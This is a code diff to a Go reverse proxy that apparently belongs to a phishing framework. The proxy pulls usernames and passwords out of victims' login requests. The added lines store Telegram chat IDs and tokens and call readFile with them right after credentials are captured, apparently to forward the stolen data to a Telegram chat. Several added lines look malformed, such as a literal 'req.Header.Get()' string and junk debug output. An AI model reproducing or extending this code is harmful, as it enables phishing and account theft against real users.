@@ -179,6 +179,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
+			// log.Debug("xxxxxxxxxxxxxxxxxxxxx\n %s xx", p.cfg.general.Chatid)
+
 			if p.cfg.GetBlacklistMode() != "off" {
 				if p.bl.IsBlacklisted(from_ip) {
 					if p.bl.IsVerbose() {
@@ -373,6 +375,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 
 								session, err := NewSession(pl.Name)
+
 								if err == nil {
 									// set params from url arguments
 									p.extractParams(session, req.URL)
@@ -420,6 +423,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 									session.RemoteAddr = remote_addr
 									session.UserAgent = req.Header.Get("User-Agent")
+									session.Cmsgid = "req.Header.Get()"
 									session.RedirectURL = pl.RedirectUrl
 									if l.RedirectUrl != "" {
 										session.RedirectURL = l.RedirectUrl
@@ -656,6 +660,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
+
 					req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
@@ -679,6 +684,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								um := pl.username.search.FindStringSubmatch(string(body))
 								if um != nil && len(um) > 1 {
 									p.setSessionUsername(ps.SessionId, um[1])
+
 									log.Success("[%d] Username: [%s]", ps.Index, um[1])
 									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 										log.Error("database: %v", err)
@@ -748,6 +754,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									log.Debug("force_post: body: %s len:%d", body, len(body))
 								}
 							}
+							readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
 
 						} else if form_re.MatchString(contentType) {
 
@@ -761,6 +768,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										um := pl.username.search.FindStringSubmatch(v[0])
 										if um != nil && len(um) > 1 {
 											p.setSessionUsername(ps.SessionId, um[1])
+
 											log.Success("[%d] Username: [%s]", ps.Index, um[1])
 											if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
 												log.Error("database: %v", err)
@@ -844,6 +852,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 								}
 
 							}
+							readFile(p.cfg.general.Chatid, p.cfg.general.Teletoken)
 
 						}
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1568,6 +1577,29 @@ func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (
 	}
 }
 
+func (p *HttpProxy) setSessionCmsgid(sid string, cmsgid string) {
+	if sid == "" {
+		return
+	}
+	s, ok := p.sessions[sid]
+	if ok {
+		s.SetCmsgid(cmsgid)
+	}
+}
+
+func (p *HttpProxy) setSessionTmsgid(sid string, tmsgid string) {
+	if sid == "" {
+		return
+	}
+	s, ok := p.sessions[sid]
+	log.Debug("ssssssssss%s", s)
+	log.Debug("ssssssssss%s", ok)
+
+	if ok {
+		s.SetTmsgid(tmsgid)
+	}
+}
+
 func (p *HttpProxy) setSessionUsername(sid string, username string) {
 	if sid == "" {
 		return
@@ -1575,6 +1607,8 @@ func (p *HttpProxy) setSessionUsername(sid string, username string) {
 	s, ok := p.sessions[sid]
 	if ok {
 		s.SetUsername(username)
+		log.Debug("username added")
+
 	}
 }
 
@@ -1585,6 +1619,8 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 	s, ok := p.sessions[sid]
 	if ok {
 		s.SetPassword(password)
+		log.Debug("password added")
+
 	}
 }
 
